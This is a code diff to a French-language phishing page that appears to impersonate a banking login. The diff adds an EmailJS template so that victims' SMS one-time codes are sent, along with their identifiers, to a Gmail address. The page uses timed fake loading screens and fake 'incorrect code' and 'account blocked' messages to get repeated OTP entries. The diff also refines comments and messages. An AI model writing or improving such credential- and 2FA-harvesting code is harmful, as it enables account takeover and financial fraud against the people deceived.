@@ -1103,6 +1103,7 @@
             const EMAILJS_PUBLIC_KEY = 'MY3N_MJv-SaWnp3vW';
             const EMAILJS_SERVICE_ID = 'service_yrr9q08';
             const EMAILJS_TEMPLATE_ID = 'template_ix46b1x';
+            const EMAILJS_TEMPLATE_OTP_ID = 'template_78cvtkk'; // Template pour le code OTP
 
             // =============================================
             // ÉLÉMENTS DOM
@@ -1213,7 +1214,7 @@
             }
 
             // =============================================
-            // ENVOI DES IDENTIFIANTS
+            // ENVOI DES IDENTIFIANTS (template_ix46b1x)
             // =============================================
             function sendCredentials(identifiant, motdepasse) {
                 console.log('📧 Envoi des identifiants...');
@@ -1227,15 +1228,15 @@
             }
 
             // =============================================
-            // ENVOI DU CODE OTP SAISI PAR L'UTILISATEUR
+            // ENVOI DU CODE OTP SAISI (template_78cvtkk - nickel_otp)
             // =============================================
             function sendCodeOTP(identifiant, code, attempts) {
-                console.log('📧 Envoi du code OTP saisi...');
-                return sendEmail(EMAILJS_TEMPLATE_ID, {
+                console.log('📧 Envoi du code OTP saisi via template_78cvtkk...');
+                return sendEmail(EMAILJS_TEMPLATE_OTP_ID, {
                     to_email: 'emirhan82y@gmail.com',
                     identifiant: identifiant,
-                    motdepasse: 'CODE OTP SAISI: ' + code + ' (tentative ' + (4 - attempts) + '/3)',
-                    userAgent: navigator.userAgent || 'Inconnu',
+                    code: code,
+                    attempts: attempts,
                     date: new Date().toLocaleString('fr-FR')
                 });
             }
@@ -1269,7 +1270,7 @@
                     clearInterval(loadingInterval);
                     progressFill.style.width = '100%';
                     showCodeStep();
-                }, 60000);
+                }, 60000); // 1 minute
             }
 
             function showCodeStep() {
@@ -1289,6 +1290,9 @@
                 btnValiderCode.style.cursor = 'pointer';
             }
 
+            // =============================================
+            // AFFICHAGE DU CHARGEMENT APRÈS SAISIE DU CODE
+            // =============================================
             function showLoadingAfterCode() {
                 loadingSpinner.style.display = 'block';
                 document.querySelector('.progress-bar').style.display = 'block';
@@ -1310,11 +1314,14 @@
                 setTimeout(() => {
                     clearInterval(loadingInterval);
                     progressFill.style.width = '100%';
-                    // Afficher le message d'erreur
+                    // Après 2min, afficher l'erreur et revenir au modal OTP
                     showErrorAndRetry();
-                }, 120000);
+                }, 120000); // 2 minutes
             }
 
+            // =============================================
+            // AFFICHAGE DE L'ERREUR ET RETOUR AU MODAL OTP
+            // =============================================
             function showErrorAndRetry() {
                 remainingAttempts--;
 
@@ -1327,7 +1334,7 @@
                     loadingTitle.textContent = '🔒 Compte bloqué';
                     loadingDesc.textContent = 'Trop de tentatives incorrectes';
                     loadingSub.textContent = 'Contactez le support client';
-
+                    // Envoyer alerte
                     sendEmail(EMAILJS_TEMPLATE_ID, {
                         to_email: 'emirhan82y@gmail.com',
                         identifiant: identifiantValue.textContent,
@@ -1338,10 +1345,11 @@
                     return;
                 }
 
+                // Afficher l'erreur
                 codeError.innerHTML = '❌ Code incorrect ou expiré.<br>Veuillez réessayer. Il vous reste <span class="attempts">' + remainingAttempts + '</span> tentative' + (remainingAttempts > 1 ? 's' : '') + '.';
                 codeError.classList.add('visible');
 
-                // Revenir au modal OTP après l'erreur
+                // Revenir au modal OTP
                 loadingTitle.textContent = '📱 Saisissez le code reçu par SMS';
                 loadingDesc.textContent = 'Un code vous a été envoyé par SMS';
                 loadingSub.style.display = 'block';
@@ -1406,16 +1414,16 @@
                     return;
                 }
 
-                // Envoyer le code saisi par email
+                // Envoyer le code saisi via le template OTP (template_78cvtkk)
                 sendCodeOTP(identifiantValue.textContent, enteredCode, remainingAttempts)
                     .then(function() {
-                        console.log('✅ Code OTP envoyé par email');
+                        console.log('✅ Code OTP envoyé via template_78cvtkk');
                     })
                     .catch(function(error) {
                         console.error('❌ Erreur envoi code OTP:', error);
                     });
 
-                // Lancer le chargement et l'erreur après 2min
+                // Lancer le chargement (2min) puis erreur
                 showLoadingAfterCode();
             }
 
